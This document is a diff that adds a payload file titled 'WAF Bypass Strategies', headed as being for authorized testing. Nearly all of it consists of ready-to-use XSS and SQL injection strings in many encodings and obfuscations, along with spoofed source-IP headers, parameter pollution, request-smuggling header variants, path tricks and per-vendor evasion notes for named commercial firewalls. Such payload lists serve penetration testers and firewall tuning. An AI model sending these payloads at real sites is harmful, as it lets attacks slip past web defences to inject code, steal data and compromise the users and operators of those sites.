@@ -1,0 +1,168 @@
+# WAF Bypass Strategies
+# For authorized security testing and research only
+#
+# These techniques are used to test WAF effectiveness during
+# authorized security assessments.
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 1: ENCODING TECHNIQUES
+# ═══════════════════════════════════════════════════════════════════
+
+# ─── URL ENCODING ─────────────────────────────────────────────────
+# Standard: <script>alert(1)</script>
+%3cscript%3ealert(1)%3c%2fscript%3e
+
+# Double URL encoding
+%253cscript%253ealert(1)%253c%252fscript%253e
+
+# Mixed encoding
+%3Cscript>alert(1)</script>
+
+# ─── HTML ENCODING ────────────────────────────────────────────────
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# ─── UNICODE ENCODING ─────────────────────────────────────────────
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\u0027 OR \u00271\u0027=\u00271
+
+# ─── HEX ENCODING ─────────────────────────────────────────────────
+0x3c7363726970743e616c6572742831293c2f7363726970743e
+CHAR(60)+CHAR(115)+CHAR(99)+CHAR(114)+CHAR(105)+CHAR(112)+CHAR(116)+CHAR(62)
+
+# ─── BASE64 (for data URIs) ───────────────────────────────────────
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 2: CASE VARIATION
+# ═══════════════════════════════════════════════════════════════════
+
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1
+SeLeCt * FrOm UsErS
+SELECT * FROM users
+select * from users
+SeLeCt/**/1/**/FrOm/**/uSeRs
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 3: COMMENT INSERTION
+# ═══════════════════════════════════════════════════════════════════
+
+# MySQL comments
+' OR/**/1=1--
+' OR/*!50000 1*/=1--
+SELECT/**/*/**/FROM/**/users
+UN/**/ION/**/SEL/**/ECT 1,2,3
+
+# SQL inline comments
+' OR 1/*comment*/=1--
+SELECT 1,2,3/*comment*/FROM users
+' /*!OR*/ '1'='1
+
+# ─── WHITESPACE ALTERNATIVES ──────────────────────────────────────
+# Tab, newline, carriage return, form feed
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'%0dOR%0d1=1--
+'%0cOR%0c1=1--
+'%a0OR%a01=1--
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 4: HTTP HEADER MANIPULATION
+# ═══════════════════════════════════════════════════════════════════
+
+# Headers that may bypass WAF source IP checks:
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+
+# Content-Type manipulation for JSON injection bypass
+Content-Type: application/json
+Content-Type: text/xml
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+
+# Custom headers that may bypass inspection
+X-Custom-IP-Authorization: 127.0.0.1
+X-WAF-Bypass: true
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 5: PARAMETER POLLUTION
+# ═══════════════════════════════════════════════════════════════════
+
+# HTTP Parameter Pollution
+# WAF may inspect first parameter, app uses last (or vice versa)
+?id=1&id=2 UNION SELECT 1,2,3--
+?id=1 UNION/*&id=*/SELECT 1,2,3--
+
+# JSON parameter pollution
+{"id":"1","id":"1 UNION SELECT 1,2,3--"}
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 6: REQUEST SMUGGLING / CHUNKING
+# ═══════════════════════════════════════════════════════════════════
+
+# Transfer-Encoding manipulation
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding:[tab]chunked
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 7: PATH-BASED BYPASSES
+# ═══════════════════════════════════════════════════════════════════
+
+# Path normalization bypass
+/admin/../page?id=1
+//page?id=1
+/./page?id=1
+/%2e/page?id=1
+
+# Extension bypass
+/page.php/nonexistent.jpg?id=1
+/page.php;.jpg?id=1
+/page.php%00.jpg?id=1
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 8: JSON/XML BYPASS
+# ═══════════════════════════════════════════════════════════════════
+
+# Switch from form-urlencoded to JSON
+{"username":"admin' OR '1'='1","password":"anything"}
+
+# XML injection
+<?xml version="1.0"?>
+<data>
+  <username>admin' OR '1'='1</username>
+</data>
+
+# ═══════════════════════════════════════════════════════════════════
+# SECTION 9: PAYLOAD FRAGMENTATION
+# ═══════════════════════════════════════════════════════════════════
+
+# Split across multiple parameters
+param1=<scr&param2=ipt>alert(1)</script>
+
+# Split across headers and body
+# (requires custom tool implementation)
+
+# ═══════════════════════════════════════════════════════════════════
+# WAF VENDOR-SPECIFIC NOTES
+# ═══════════════════════════════════════════════════════════════════
+
+# Cloudflare: Often bypass with Unicode lookalikes, chunked encoding
+# ModSecurity: Comment insertion, case variation usually effective
+# AWS WAF: Null bytes, alternate encodings
+# Imperva: Header spoofing, parameter pollution
+# F5 BIG-IP ASM: CRLF injection, path normalization
+# Akamai: JSON content-type bypass, unusual whitespace
